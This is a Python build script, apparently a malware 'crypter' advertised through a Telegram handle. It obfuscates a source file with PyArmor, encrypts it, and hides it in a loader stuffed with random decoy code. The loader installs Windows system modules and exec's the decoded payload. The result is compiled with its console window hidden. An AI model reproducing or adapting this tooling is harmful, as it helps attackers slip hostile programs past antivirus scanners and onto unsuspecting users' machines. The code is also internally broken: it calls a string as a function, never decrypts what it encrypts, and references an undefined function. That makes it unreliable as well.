import argparse
import base64
import subprocess
import random
import os
import string
import logging
import sys


try:
    import cryptography # type: ignore
except ImportError:
    subprocess.run(f'python -m pip install cryptography', shell=True, check=True)

from cryptography.fernet import Fernet # type: ignore

BUILD_PATH = "./build"
SOURCE_FILE = "source.py"
MINIFIED_FILE = "minified_code.py"
OBFUSCATED_FILE = "obfuscated_code.py"
ENCRYPTION_KEY_FILE = "encryption_key.txt"

logging.basicConfig(level=logging.INFO)

def run_command(command, args):
    cmd = [command] + args
    try:
        subprocess.run(cmd, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error occurred while running {' '.join(cmd)}: {e}")
        sys.exit(1)

def minify_code():
    print("Minifying code with Pyminifier...")
    run_command('pyminifier', ['-o', MINIFIED_FILE, SOURCE_FILE])

def obfuscate_code():
    print("Obfuscating code with PyArmor...")
    run_command('pyarmor', ['pack', '-e', ' --onefile', '-x', ' --exclude', MINIFIED_FILE])
    obfuscated_code_dir = 'dist'
    obfuscated_files = [f for f in os.listdir(obfuscated_code_dir) if f.endswith('.py')]
    if obfuscated_files:
        global OBFUSCATED_FILE
        OBFUSCATED_FILE = os.path.join(obfuscated_code_dir, obfuscated_files[0])

def encrypt_code(code, key):
    cipher_suite = Fernet(key)
    encrypted_code = cipher_suite.encrypt(code.encode())
    return base64.b64encode(encrypted_code).decode('utf-8')

def create_fake_wrapper(encoded_code):
    fake_code = generate_fake_code()
    wrapper_code = f"""
import subprocess
import sys
import os
import platform
import base64
import random

{fake_code()}

required_modules = [
    "aiohttp",
    "requests",
    "psutil",
    "pywin32",
    "cryptography"
]

def install_package(package_name):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package_name])

def ensure_packages():
    for module in required_modules:
        try:
            __import__(module)
        except ImportError:
            install_package(module)

def install_python():
    if os.name == "nt":
        python_urls = {
            "3.10.9": "https://www.python.org/ftp/python/3.10.9/python-3.10.9-amd64.exe",
            "3.11.7": "https://www.python.org/ftp/python/3.11.7/python-3.11.7-amd64.exe"
        }
        
        for version, url in python_urls.items():
            installer_path = f"python_installer_{{version}}.exe"
            subprocess.check_call(["curl", "-L", url, "-o", installer_path])
            subprocess.check_call([installer_path, "/quiet", "InstallAllUsers=1", "PrependPath=1"])
            os.remove(installer_path)
            break

{fake_code()}            

def main():
    ensure_packages()
    encoded_code = "{encoded_code}"
    decoded_code = base64.b64decode(encoded_code).decode('utf-8')
    exec(decoded_code)

{fake_code()}

if __name__ == "__main__":
    if sys.version_info < (3, 6):
        install_python()
    else:
        main()
"""
    return wrapper_code

def compile_code(source_file):
    print("Compiling code with Nuitka...")
    run_command('nuitka', ['--standalone', '--onefile', '--windows-disable-console', '--output-dir=' + BUILD_PATH, source_file])

def generate_random_string(length=19, chars=string.ascii_letters + string.digits):
    return ''.join(random.choice(chars) for _ in range(length))

def generate_fake_code(num_vars=10, num_funcs=15, num_classes=10):
    fake_code = [f"{generate_random_string()} = {repr(random.randint(1000000, 100000000))}" for _ in range(num_vars)]

    def get_user_info():
        return {'username': generate_random_string(7), 'age': random.randint(18, 99)}

    def get_channel_name():
        return repr(generate_random_string())

    def get_repos():
        return [repr(generate_random_string()) for _ in range(random.randint(1, 5))]

    fake_functions = [get_user_info, get_channel_name, get_repos]
    fake_classes = [f"class {generate_random_string()}:\n    def __init__(self):\n        self.data = {repr(random.choice([True, False]))}\n    def get_data(self):\n        return self.data" for _ in range(num_classes)]
    all_code = fake_code + fake_functions + fake_classes
    all_code = [str(item()) if callable(item) else str(item) for item in all_code]
    all_code = random.sample(all_code, len(all_code))
    return "\n".join(all_code)

def main():
    parser = argparse.ArgumentParser(description='bo2k168kb on telegram.')
    parser.add_argument('name', help='get by.')
    args = parser.parse_args()

    if not os.path.exists(BUILD_PATH):
        os.makedirs(BUILD_PATH)

    minify_code()
    obfuscate_code()

    with open(OBFUSCATED_FILE, "r") as file:
        obfuscated_code = file.read()

    key = Fernet.generate_key()
    with open(ENCRYPTION_KEY_FILE, "wb") as key_file:
        key_file.write(key)

    encoded_code = encrypt_code(obfuscated_code, key)
    wrapper_code = create_fake_wrapper(encoded_code)
    obfuscated_file_path = os.path.join(BUILD_PATH, args.name + '.py')

    with open(obfuscated_file_path, "w") as obfu_file:
        obfu_file.write(wrapper_code)

    compile_code(obfuscated_file_path)
    os.remove(ENCRYPTION_KEY_FILE)
    logging.info(f"The code has been obfuscated and compiled, Filename: {obfuscated_file_path}")

if __name__ == "__main__":
    if sys.version_info < (3, 6):
        install_python()
    else:
        main()

